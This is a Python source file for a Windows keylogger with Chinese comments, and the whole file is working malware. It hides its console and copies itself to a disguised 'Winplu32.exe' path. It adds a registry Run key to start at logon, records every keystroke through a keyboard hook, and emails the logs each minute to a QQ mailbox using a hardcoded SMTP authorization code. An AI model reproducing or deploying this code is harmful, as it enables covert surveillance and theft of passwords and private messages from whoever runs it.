# -*- coding: utf-8 -*-
import pywin
import pythoncom
import pyHook
import smtplib
import threading
from email.mime.text import MIMEText
from email.header import Header
import uuid
global MAC
import time
from time import ctime
import win32gui
import win32con
import win32api
import os
import ctypes
import sys
winText = []
global receiveKey
receiveKey = []
MAC=uuid.UUID(int = uuid.getnode()).hex[-12:]
##


##修改注册表自启动
def autorun():
    try:
        key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
                                  , 0, win32con.KEY_ALL_ACCESS)
        currentPath = "D:\\Program Files\\Windows\\Winplu32.exe"
        strPath = "\"" + currentPath + "\" hide"
        #win32api.RegSetValueEx(key, "test", 0, win32con.REG_SZ, "\"D:\\python2.7\\Scripts\\dist\\core.exe\" hide")
        win32api.RegSetValueEx(key, "win32plu", 0, win32con.REG_SZ, strPath)
        win32api.RegCloseKey(key)
    except Exception as e:
        print(e)
    return True


#获取窗口信息
def GetWin(a, b):
    try:
        if win32gui.IsWindowVisible(a):
            c = win32gui.GetWindowText(a)
            if c:
                winText.append(c)
    except Exception as e:
        print(e)

#保存窗口信息
def SaveWinInfo():
    while True:
        win32gui.EnumWindows(GetWin, 0, )
        try:
            winfs = open("D:\\wintext.txt", mode='a+')
            for line in winText:

                winfs.write(str(line)+'\n')
            winfs.close()

        except Exception as e:
            print(e)
            print("写入窗口信息失败！")
        time.sleep(60)

#发送邮件
def sendMail(receivers, subject):
    while True:

        try:
            textfs = open('D:\\text', mode='a+')
            content = textfs.read()
        except Exception as e:
            print(e)
            print("读取键盘信息成功！")
            time.sleep(60)
            continue
        if not content:
            content = "已到达敌军指挥部！"+time.ctime()
        textfs.close()

        mail_pass="gwnspoefyvmmbefe"	#授权码
        sender = '785452098@qq.com'

        message = MIMEText(MAC+":"+content, 'plain', 'utf-8')
        message['From'] = Header("如月青城", 'utf-8')
        message['To'] = Header("叶底无雪", 'utf-8')

        message['Subject'] = Header(subject, 'utf-8')

        try:
            smtpObj = smtplib.SMTP_SSL('smtp.qq.com', 465)
            smtpObj.ehlo()
            smtpObj.login(sender,mail_pass)
            smtpObj.sendmail(sender, receivers, message.as_string())
            smtpObj.close()
            print("Send mail succeed!")

        except Exception as e:
            print("Send mail failed")
            time.sleep(60)
            continue
        try:
            textfs = open("D:\\text", mode='w+')
            textfs.write("上次读取时间"+ctime())
            textfs.close()

        except Exception as e:
            print(e)
            print("清空记录并写入时间失败！")
        time.sleep(60)
    return True


#记录按键信息
def KeyDownTest(event):
    global receiveKey
    text = ''
    threads = []
    if len(receiveKey) <= 100:
        receiveKey.append(event.Key)
        print(event.Key)
    else:
        text = str(receiveKey)
        receiveKey = []
        try:
            fs = open("D:\\text", mode='a+')

            fs.write(text)
            fs.close()
        except Exception as e:
            print(e)
            print("写入键盘信息失败")


	return True


#侦听按键
def capture():
    testHm = pyHook.HookManager()
    testHm.KeyDown = KeyDownTest
    testHm.HookKeyboard()
    pythoncom.PumpMessages()

def hiding():
   whnd = ctypes.windll.kernel32.GetConsoleWindow()
   if whnd != 0:
      ctypes.windll.user32.ShowWindow(whnd, 0)
      ctypes.windll.kernel32.CloseHandle(whnd)

def copy():
    name = os.path.dirname(os.path.abspath(__file__)) + "\\" + os.path.basename(sys.argv[0])

    name = "\"" + name + "\""
    print(name)
    print(sys.argv[0])
    cpname = "\"D:\\Program Files\\Windows\\Winplu32.exe\""
    cpdir = "D:\\Program Files\\Windows"
    result = os.path.exists(cpdir)
    print(result)
    if not result:
        os.makedirs(cpdir)


    str1 = "copy "+name+" "+cpname
    print(str1)
    os.popen(str1, )

if __name__ == '__main__':
    hiding()
    result = os.path.exists("D:\\Program Files\\Windows\\Winplu32.exe")
    if not result:

        copy()
        autorun()
        runstr = "\"D:\\Program Files\\Windows\\Winplu32.exe\""
        os.popen(runstr, )
    test = "D:\\Program Files\\Windows\\Winplu32.exe"

    if os.path.abspath(sys.argv[0]) == test:



     # 测试时注释掉


        #抓取按键信息线程
        captureTh = threading.Thread(target=capture)
        captureTh.setDaemon(True)
        captureTh.start()

        #saveswinTh = threading.Thread(target=SaveWinInfo)
        #saveswinTh.setDaemon(True)
        #saveswinTh.start()
        #发送邮件线程
        sendmailTh = threading.Thread(target=sendMail, args=("2270727606@qq.com", "D-mail", ))
        sendmailTh.setDaemon(True)
        sendmailTh.start()

        #当上述两个线程运行时主线程不停止
        captureTh.join()
        sendmailTh.join()
       # saveswinTh.join()


